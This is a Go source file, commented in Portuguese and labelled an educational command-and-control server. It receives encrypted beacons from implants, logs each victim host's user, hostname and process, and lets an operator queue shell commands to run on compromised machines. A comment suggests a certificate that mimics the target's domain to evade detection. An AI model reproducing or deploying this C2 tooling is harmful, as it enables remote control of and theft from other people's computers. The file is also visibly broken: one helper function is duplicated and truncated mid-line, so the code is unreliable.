// Server C2 educacional — beaconing HTTP/TLS + tasks assíncronas.
package main

import (
	"bufio"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/seuusuario/lab-c2/internal/proto"
)

// ===== ESTADO GLOBAL DO C2 =====

type server struct {
	mu        sync.Mutex
	key       []byte
	implants  map[string]proto.SysInfo   // id -> info do host
	taskQueue map[string][]proto.Task    // id -> fila de tasks pendentes
	results   map[string][]proto.Result  // id -> histórico de resultados
}

func newServer(secret string)*server {
	return &server{
		key:proto.DeriveKey(secret),
		implants:make(map[string]proto.SysInfo),
		taskQueue:make(map[string][]proto.Task),
		results:make(map[string][]proto.Result),
	}
}

// ===== HANDLER PRINCIPAL: POST /api/v1/beacon =====
// Todo implante fala com o server por aqui, cifrado de ponta a ponta.
func (s*server)handleBeacon(w http.ResponseWriter,r *http.Request) {
	if r.Method !=http.MethodPost {
		http.Error(w,"método não permitido",http.StatusMethodNotAllowed)
		return
	}

	// ---- 1. Decifra o envelope recebido ----
	var msg proto.Message
	body := make([]byte,r.ContentLength)
	if _,err := io_readFull(r,body);err !=nil {
		http.Error(w,"corpo inválido",http.StatusBadRequest)
		return
	}
	if err := proto.DecodeMessage(s.key,string(body),&msg);err !=nil {
		// Falha ao decifrar = chave errada ou não-somos-nós. Resposta genérica.
		http.Error(w,"não autorizado",http.StatusUnauthorized)
		return
	}

	s.mu.Lock()

	// ---- 2. Registra implant novo ----
	if _,ok := s.implants[msg.ID]; !ok &&msg.Info.Hostname !="" {
		s.implants[msg.ID]= msg.Info
		logf("[+] NOVO IMPLANTE %s — %s\\%s @ %s (pid %d)",
			msg.ID[:8],msg.Info.OS,msg.Info.User,msg.Info.Hostname,msg.Info.PID)
	}

	// ---- 3. Armazena resultados recebidos ----
	for _,res := range msg.Results {
		s.results[msg.ID]= append(s.results[msg.ID],res)
		logf("[=] resultado de %s (task %s): %.200s",msg.ID,res.UID,res.Output)
	}

	// ---- 4. Pega a fila de tasks e LIMPA (entrega uma vez só) ----
	tasks := s.taskQueue[msg.ID]
	delete(s.taskQueue,msg.ID)

	s.mu.Unlock()

	// ---- 5. Responde com as tasks, cifrado ----
	resp := proto.Message{ID:msg.ID,Kind:"tasks",Tasks:tasks}
	enc,err := proto.EncodeMessage(s.key,resp)
	if err !=nil {
		http.Error(w,"erro interno",http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type","application/octet-stream")
	w.Write([]byte(enc))
}

// ===== CONSOLE DO OPERADOR =====
func (s*server)console() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("c2> ")
		if !scanner.Scan() {
			return
		}
		fields := strings.Fields(scanner.Text())
		if len(fields) ==0 {
			continue
		}
		switch fields[0] {
		case "implants":
			s.mu.Lock()
			if len(s.implants) ==0 {
				fmt.Println("nenhum implante registrado ainda")
			}
			for id,info := range s.implants {
				fmt.Printf("  %s  %s\\%s @ %s\n",id,info.OS,info.User,info.Hostname)
			}
			s.mu.Unlock()

		case "shell":// shell <id> <comando...>
			if len(fields) <3 {
				fmt.Println("uso: shell <id> <comando>")
				continue
			}
			id := fields[1]
			cmd := "shell " + strings.Join(fields[2:]," ")
			s.enqueue(id,cmd)

		case "sleep":// sleep <id> <segundos>
			if len(fields) !=3 {
				fmt.Println("uso: sleep <id> <segundos>")
				continue
			}
			s.enqueue(fields[1],"sleep "+fields[2])

		case "kill":// kill <id>
			s.enqueue(fields[1],"exit")

		default:
			fmt.Println("comandos: implants | shell <id> <cmd> | sleep <id> <n> | kill <id>")
		}
	}
}

func (s*server)enqueue(id,cmd string) {
	s.mu.Lock()
	s.taskQueue[id]= append(s.taskQueue[id],proto.Task{
		UID:fmt.Sprintf("%08x",time.Now().UnixNano()),
		Cmd:cmd,
	})
	s.mu.Unlock()
	logf("[*] task enfileirada para %s",id)
}

func logf(format string,args ...any) {
	fmt.Printf(time.Now().Format("15:04:05

// ===== FUNÇÕES AUXILIARES =====

// io_readFull lê exatamente len(buf) bytes do corpo da requisição.
func io_readFull(r *http.Request,buf []byte) (int,error) {
	return io.ReadFull(r.Body,buf)
}

func logf(format string,args ...any) {
	fmt.Printf(time.Now().Format("15:04:05")+" "+format+"\n",args...)
}

// ===== GERAÇÃO DE CERTIFICADO TLS SELF-SIGNED =====
// Em lab, geramos o certificado na hora. Em cenário real usaria
// Let's Encrypt ou um certificado que "mimetize" o domínio alvo.
func generateCert() (tls.Certificate,error) {
	key,err := ecdsa.GenerateKey(elliptic.P256(),rand.Reader)
	if err !=nil {
		return tls.Certificate{},err
	}
	template := x509.Certificate{
		SerialNumber:big.NewInt(1),
		NotBefore:time.Now(),
		NotAfter:time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:x509.KeyUsageKeyEncipherment |x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der,err := x509.CreateCertificate(rand.Reader,&template,&template,&key.PublicKey,key)
	if err !=nil {
		return tls.Certificate{},err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type:"CERTIFICATE",Bytes:der})
	keyDER,_ := x509.MarshalECPrivateKey(key)
	keyPEM := pem.EncodeToMemory(&pem.Block{Type:"EC PRIVATE KEY",Bytes:keyDER})
	return tls.X509KeyPair(certPEM,keyPEM)
}

// ===== MAIN: sobe o HTTPS listener + console em threads separadas =====
func main() {
	port := flag.Int("port",443,"porta do listener HTTPS")
	secret := flag.String("secret","chave-super-secreta-do-lab","segredo compartilhado p/ derivar a chave AES")
	flag.Parse()

	s := newServer(*secret)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/beacon",s.handleBeacon)

	cert,err := generateCert()
	if err !=nil {
		log.Fatal("erro gerando certificado: ",err)
	}
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}}
	srv := &http.Server{
		Addr:fmt.Sprintf(":%d",*port),
		Handler:mux,
		TLSConfig:tlsCfg,
	}

	go func() {
		logf("[*] C2 escutando em https://0.0.0.0:%d/api/v1/beacon",*port)
		if err := srv.ListenAndServeTLS("","");err !=nil {
			log.Fatal(err)
		}
	}()

	s.console()// console do operador roda em primeiro plano
}
